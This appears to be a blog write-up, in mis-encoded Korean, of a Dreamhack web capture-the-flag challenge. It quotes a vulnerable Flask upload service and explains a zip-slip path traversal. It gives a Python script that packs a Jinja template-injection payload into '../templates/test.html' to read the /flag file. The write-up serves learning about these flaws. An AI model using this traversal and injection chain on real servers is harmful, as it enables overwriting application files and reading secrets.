---
layout: single
title: "[Dreamhack] ê±°ë¶ì´ write-up"
date: 2025-08-26 20:00 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: ëª©ì°¨
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## [Dreamhack] ê±°ë¶ì´

### ğŸ˜ ë¬¸ì œ ì„¤ëª…

- ì§‘ ì•ì—ì„œ ê±°ë¶ì´ë¥¼ ì£¼ì›Œ ì–´í•­ì— ë„£ì–´ë‘ì—ˆëŠ”ë°, ë‹¤ìŒ ë‚  ë³´ë‹ˆ ì‚¬ë¼ì¡ŒìŠµë‹ˆë‹¤.
  â€œì–´í•­ì´ ë†’ì€ë°â€¦ ëŒ€ì²´ ì–´ë–»ê²Œ ë¹ ì ¸ë‚˜ê°„ ê±°ì§€?â€

<br>

### âœï¸ í’€ì´

ë¬¸ì œì— ì ‘ì†í•˜ë©´ íŒŒì¼ ì—…ë¡œë“œ ê¸°ëŠ¥ì´ ì¡´ì¬í•œë‹¤.

![image-20250822161936863](/images/2025-08-21-á„€á…¥á„‡á…®á†¨á„‹á…µ/image-20250822161936863.png)

<br>

ì•„ë˜ ì†ŒìŠ¤ ì½”ë“œë¥¼ ë³´ë©´ íŒŒì¼ì„ ì—…ë¡œë“œí•  ë•Œ /uploads ê²½ë¡œë¡œ íŒŒì¼ì´ ì—…ë¡œë“œëœë‹¤. íŒŒì¼ì€ /uploads ê²½ë¡œì— ìˆ«ìë¡œ ì—…ë¡œë“œë˜ê³  zipë¡œ ì—…ë¡œë“œí•˜ë©´ ê²½ë¡œê°€ í¬í•¨ë˜ë©´ /uploads/~~/test.html ì´ëŸ°ì‹ìœ¼ë¡œ ì—…ë¡œë“œ ë˜ëŠ” ê²ƒ ê°™ë‹¤.

```python
app = Flask(__name__)
UPLOAD_DIR = Path("./uploads").resolve()
UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
count = 1

@app.route("/", methods=["GET"])
def main():   
    return render_template('upload.html')
    
@app.route("/upload", methods=["POST"])
def upload():
    global count
    if "file" not in request.files:
        return jsonify(ok=False, error="no file"), 400

    f = request.files["file"]
    if f.filename == "":
        return jsonify(ok=False, error="empty filename"), 400

    if (f.filename or "").lower().endswith(".zip") or "zip" in (f.content_type or "").lower():
        data = f.read()
        zf = zipfile.ZipFile(io.BytesIO(data))
        names = []
        for info in zf.infolist():
            target = UPLOAD_DIR / info.filename
            if info.is_dir():
                target.mkdir(parents=True, exist_ok=True)
            else:
                target.parent.mkdir(parents=True, exist_ok=True)
                with zf.open(info) as src, open(target, "wb") as dst:
                    shutil.copyfileobj(src, dst)
            names.append(info.filename)
        return jsonify(ok=True, saved=names)
    
    ext = Path(f.filename).suffix.lower()
    file_name = f"{count}{ext}" if ext else f"{count}"
    count += 1
    
    out = UPLOAD_DIR / file_name
    out.parent.mkdir(parents=True, exist_ok=True)
    f.save(out)
    return jsonify(ok=True, saved=str(file_name))    
    
@app.route("/test.html", methods=["GET"])
def test_page():
    return render_template("test.html")
    
@app.route("/uploads/<path:filename>")
def serve_uploads(filename):
    return send_from_directory(UPLOAD_DIR, filename, as_attachment=False)
    
app.config.update(PROPAGATE_EXCEPTIONS=False)

@app.errorhandler(Exception)
def _all_errors_to_400(e):
    return jsonify(ok=False, error="bad request"), 400

@app.errorhandler(HTTPException)
def _http_errors_to_400(e):
    return jsonify(ok=False, error="bad request"), 400
    
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
```

<br>

ì—…ë¡œë“œí•  ë•Œ ì•„ë˜ ì†ŒìŠ¤ ì½”ë“œë¥¼ ë³´ë©´ zipë¥¼ ì—…ë¡œë“œí•  ë•Œ íŒŒì¼ ì•ˆì˜ ì´ë¦„ì— ëŒ€í•´ì„œ ê²€ì¦ì„ ì œëŒ€ë¡œ í•˜ì§€ ì•Šì•„ì„œ `../` ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.

```python
    if (f.filename or "").lower().endswith(".zip") or "zip" in (f.content_type or "").lower():
        data = f.read()
        zf = zipfile.ZipFile(io.BytesIO(data))
        names = []
        for info in zf.infolist():
            target = UPLOAD_DIR / info.filename
            if info.is_dir():
                target.mkdir(parents=True, exist_ok=True)
            else:
                target.parent.mkdir(parents=True, exist_ok=True)
                with zf.open(info) as src, open(target, "wb") as dst:
                    shutil.copyfileobj(src, dst)
            names.append(info.filename)
        return jsonify(ok=True, saved=names)
```

<br>

Dockerfileì„ ë´¤ì„ë•Œ flag.txtë¥¼ /flagì— ì €ì¥í•˜ì˜€ê³ , jinja SSTIë¡œ flagë¥¼ ì½ê¸° ìœ„í•´ì„œëŠ” render_template í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ëŠ” ê³³ì´ test.html ë°–ì— ì—†ê¸° ë•Œë¬¸ì— ì´ë¥¼ ë®ì–´ì•¼ í•œë‹¤.

```python
@app.route("/test.html", methods=["GET"])
def test_page():
    return render_template("test.html")
```

<br>

/test.htmlì„ ë®ì–´ì“°ê¸° ìœ„í•´ì„œ ../ë¡œ /uploads ê²½ë¡œë¥¼ íƒˆì¶œí•˜ê³  /templates/test.html íŒŒì¼ì„ ë®ì„ ìˆ˜ ìˆë‹¤. flagëŠ” /flagì— ìœ„ì¹˜í•´ ìˆê¸° ë•Œë¬¸ì— SSTI payloadê°€ í¬í•¨ëœ test.htmlì„ zipë¡œ ì••ì¶•í•´ ì—…ë¡œë“œí•˜ë©´ ëœë‹¤.

```python
import zipfile

payload = "{{ url_for.__globals__['__builtins__']['open']('/flag').read() }}"
target = "../templates/test.html"

with zipfile.ZipFile("exploit.zip", "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr(target, payload)
```

![image-20250826202637777](/images/2025-08-25-á„€á…¥á„‡á…®á†¨á„‹á…µ/image-20250826202637777.png)